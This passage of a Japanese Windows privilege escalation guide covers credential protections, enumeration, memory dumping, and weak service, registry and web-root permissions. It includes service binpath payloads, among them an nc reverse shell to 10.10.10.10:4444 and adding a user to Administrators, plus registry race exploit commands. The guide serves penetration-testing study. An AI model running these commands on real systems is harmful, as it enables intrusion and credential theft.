有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認してください**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコードのインジェクションを**阻止**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに、興味深い権限が設定されていないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、権限昇格のためにそれらを悪用する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について詳しく学びましょう: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで**興味深いtoken**と、それらを悪用する方法について学びましょう。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を実行できる可能性を探ります。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限昇格できる可能性があります。

debuggerのリスナーは短時間しか動作しないことがあるため、受動的なポートスナップショットで一度見つからなかったとしても、過去に公開されていなかった証明にはなりません。確認したリスナーについて、PID、プロセスの所有者、低権限ユーザーから到達可能かどうかを照合してください。アプリケーション名やdebugフラグだけでは、ユーザーをまたいだコード実行が可能とは判断できません。通常の列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダーのアクセス権を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルに宣言されている `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスについて調べる場合は、その設定ファイルと、宣言されているモジュールディレクトリの ACL を確認してください。自分のトークンでその場所にファイルを作成できる場合、次回そのタスクまたはサービスがモジュールを読み込む際にコード実行が可能になるかを調査する候補となります。そのタスクまたはサービスの実行アカウントで有効な権限、アクティブな設定、モジュールの互換性、拒否設定や共有の制限を確認してください。ディレクトリに書き込めるだけでは、権限昇格が成立するとは限りません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows Apache のインストール環境では、サービスの実行ファイルのパスと実行アカウントを、アクティブな `httpd.conf` の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低い権限のユーザーがそのルートにファイルを作成できる場合、サーバー側コードの実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、該当する正確なパスが公開されていること、そしてサーバー側のハンドラーがそのファイル形式を処理することを確認してください。ルートへの書き込みが可能というだけでは、ファイルを作成できることしか証明されません。プローブを書き込まずに ACL を確認します。

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP のインストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を指し、設定ファイルはその隣の `conf\httpd.conf` にあり、既定のルートは `C:\wamp64\www` または `C:\wamp\www` です。正確なサービスイメージ、実行時の ID、有効な `DocumentRoot`（`${INSTALL_DIR}` の展開と virtual host による上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能だからといって、Apache が `SYSTEM` として実行されている、または配置したファイルを実行するとは限りません。[Apache は、Windows サービスが設定を選択する方法を説明しています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、書き込み可能な物理ディレクトリを `applicationHost.config` 内の**稼働中のサイト/アプリケーション**に対応付けたうえで、設定されたプールとサーバー側の handler を特定してください。配信ディレクトリに置いたコードがプールとして実行されるのは、IIS がそのファイルタイプを処理し、かつそのルートに到達できる場合だけです。書き込み可能なディレクトリを code execution とみなす前に、現在のユーザーが実際にファイルを作成できるか、サイトが稼働中か、handler とパスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについても、別の経路として確認が必要です。生成ファイルはアプリケーションのコンパイルディレクトリに置かれます。既定では、該当する .NET Framework のインストール先配下の `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は場所とアプリケーションごとのサブディレクトリについて説明しています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、[アプリケーションプール間で互いを信頼しない場合に、コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合、そのアプリケーションがより高い権限の[worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけでは code execution の証明になりません。キャッシュが稼働中のアプリケーションに属すること、有効なトークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したりキャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として設定された IIS プールは、ローカルのトークンが低い権限であっても、通常は**ホストコンピューターアカウント**としてドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` プールは、設定されたアカウントを使用します。[Microsoft はこれらの ID タイプ](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID 設定が省略されている場合はプールの既定値が継承されることがあり、その値は IIS の世代によって異なります。プール名から推測せず、有効な設定を確認してください。code execution がコンピューターアカウントのネットワーク ID を持つプールに到達する場合は、**その特定のコンピューター**が持つディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメインの命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限があるとは証明できません。受動的な列挙では、ファイルをアップロードしたり、ネットワーク認証を行ったり、チケットを要求したりせずに、設定と ACL を確認してください。

ヘルパープロセスを起動する、読み取り可能な ASP.NET handler については、リクエスト由来の値が認証、復号、検証、コマンド構築を経る過程を追跡してください。復号したトークンを `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドが変わる可能性があります。[Microsoft は `cmd` の特殊文字を説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際に復号後の値に影響を与えられ、handler に到達できることを確認してから、有効なアプリケーションプールまたは impersonation の ID と子プロセスの ID を特定してください。ソースコードの行が読めること、localhost の listener があること、トークン形式に弱点があることだけでは、特権コマンドの実行を証明できません。受動的な列挙では、偽造したリクエストを送ったりヘルパーを実行したりせずに、ソースとプール設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御可能なパスが[`include` または `require`](https://www.php.net/manual/en/function.include.php)に渡されると、低権限ユーザーが書き込み可能な PHP ファイルが worker の ID で評価される可能性があります。リクエストがその文に到達できること、解決されたパスが低権限ユーザーには変更可能で worker には読み取り可能なファイルを指すこと、適用される PHP のパス制限が include を許可すること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件は成立しません。受動的な列挙中に endpoint を呼び出さず、ソース、サービス ID、ファイル ACL を確認してください。

### メモリ上のパスワードマイニング

Sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**資格情報がメモリ内に平文で存在する**ことがあります。メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

### 特権でのプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**実際に書き込み可能なパス**、そのパスを開くプロセスまたはタスク、実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータで XML 外部エンティティが許可されていました。Windows 上でネットワークエンティティを使うと、[アウトバウンド SMB と NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可している場合、インポートを実行するアカウントから認証が発生する可能性がありました。これは認証情報が漏えいする可能性を示す手掛かりであり、ただちに administrator アクセスが得られるということではありません。応答が利用可能になるには、別の認可済みまたは脆弱な経路が必要であり、現行ビルドについては実際のパッチ適用状況に基づいて評価する必要があります。受動的な列挙中に細工されたプロジェクトを開かないでください。インポートのワークフローと ACL を確認してください。

## サービス

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定して読み取り専用の[`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであり、新しいサービスを実行できる証拠ではありません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。そのハンドルには作成時に要求されたサービスアクセス権が付与されます。後からサービスを再オープンすると別のアクセスチェックが行われ、元のハンドルを使用できた場合でも失敗することがあります。実効ローカル／リモートトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成したり、起動したりしないでください。

リモートからサービスをインストールする経路を調べる場合は、SCM 権限と、対象上にある**同じネットワークログオン**で書き込み可能な共有、その共有の基となる NTFS ACL、サービスアカウントが実行できるローカル実行ファイルのパスを関連付けて確認してください。SCM 権限が異例に広く、ファイルを配置できる経路もある場合、非管理者アカウントでもこの境界を越えられることがあります。管理者共有は必須ではありません。共有への書き込み権限だけ、または SCM のサービス作成権限だけでは、新しいサービスがより高い ID で起動できるとは限りません。

既存のサービスは、ヘルパーが `ImagePath` に含まれていなくても、起動、シャットダウン、その他のライフサイクルイベントでヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い ID で実行される場合、存在しないヘルパーファイルは条件付きの置き換え候補となります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。書き込み可能なサービスディレクトリや、ファイルが存在しないことだけでは、サービスがそのファイルを読み込む証拠にはなりません。受動的な調査中にサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` によって `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。起動権限を単なる制御権以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログやエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みに至る正確な処理フロー、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査中に、サービスを起動したりテストファイルを作成したりしないでください。

NSClient++ monitoring agent では、読み取り可能な `nsclient.ini` は**設定を調査する手掛かり**です。このファイルに Web 認証情報が含まれている可能性があり、`boot.ini` によって設定ファイルの場所が別の場所に変更されていることもあります。実際のサービスアカウント、WEB リスナーとアクセスポリシー、認証済みのロールで設定やスクリプトを変更できるかを確認してください。特権で実行するには、さらに `CheckExternalScripts`（または別の有効な実行経路）、コマンドを登録または変更する実効権限、それをサービス ID で実行するトリガーが必要です。ループバック専用リスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、リスナーだけではその権限があることの証明にはなりません。受動的な列挙中は、秘密情報を表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` になっているサービスでは、実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをこの値に保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体を判断する前に、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別途調査が必要な手掛かりです。低権限ユーザーからリスナーに到達できるか、該当する操作がそのユーザーの入力を受け入れるか、サービスの子プロセスがより高い ID で危険な操作を実行するかを確認してください。サービスアカウント、エンドポイント URL、書き込み可能なパスだけでは、権限昇格の証拠になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡されるかを追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows トランスポート認証情報を使う `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、**その特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービス ID で実行される `AddScript` に至る経路は、コード実行の境界です。ポートが待ち受けていること、クライアントが認証済みであること、または無関係なアセンブリに未使用のメソッドがあることだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みのサービス、コントラクト、認可、偽装の設定を静的に確認してください。

Service Trigger を使うと、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの到着、GPO の更新など）が発生したときに Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発生させることで特権サービスを起動できることがよくあります。列挙と有効化の手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling を含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれている場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の race を利用して、サービスの DACL リセット先をリダイレクトしました。実証された権限昇格には、利用可能な Visual Studio Setup WMI Provider MSI の修復経路と、その対象である `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` も必要でした。このコンポーネントは 2024 年 1 月に修正されています。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを調べ、Setup WMI compiler のパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio の製品バージョン、または compiler ファイルだけでは、ホストに脆弱性があることの証拠にはなりません。確認のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

**sc** を使用してサービスの情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるか確認することをおすすめします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生する場合：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では、upnphostサービスが動作するにはSSDPSRVに依存することに注意してください）**

**この問題の別の回避策**は、次を実行することです:

```
sc.exe config usosvc start= auto
```

### **サービスバイナリのパスを変更**

「Authenticated Users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つ場合、そのサービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、以下のさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権付きドメインアカウントとして実行されている一方で、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる場合**、**バイナリを置き換えてサービスを再起動する**ことで、多くの場合サービスを乗っ取れます。

**サービスが実行するバイナリを変更できるか**、またはバイナリのある**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
**wmic**（system32 内にはありません）を使えば、サービスが実行するすべてのバイナリを取得できます。**icacls** で権限を確認してください:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはその格納ディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリに書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動／サービスのトリガーを待ちます）。

便利な自動チェック：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスで通常ユーザーによる再起動が許可されていない場合は、起動時に自動で開始されるか、障害時に再起動するアクションが設定されているか、または利用するアプリケーションから間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限テストは次のように記述されていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACLエントリがあるだけでは、実効アクセスが可能だとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` 権限や `SERVICE_START` 権限とは別です。権限昇格には、利用可能なサービス構成フィールド、サービスを起動する方法、さらに高い権限を持つサービスIDも必要です。Microsoftの[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリのPathを変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリシンボリックリンク race による任意の HKLM value write（ATConfig）

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。レジストリの **symbolic link race** を利用すると、この特権的な書き込み先を **任意の HKLM パス**にリダイレクトでき、任意の HKLM **value write** を行えるようになります。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン時やセキュアデスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）：

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュアデスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを保護された HKLM の対象への **registry link** に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write が可能になったら、サービスの設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE／コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注：** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF／standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**そのレジストリの下にサブレジストリを作成できます**。Windows services の場合、これは**任意のコードを実行するのに十分です**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を末尾に持つパスをすべて実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙します。

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

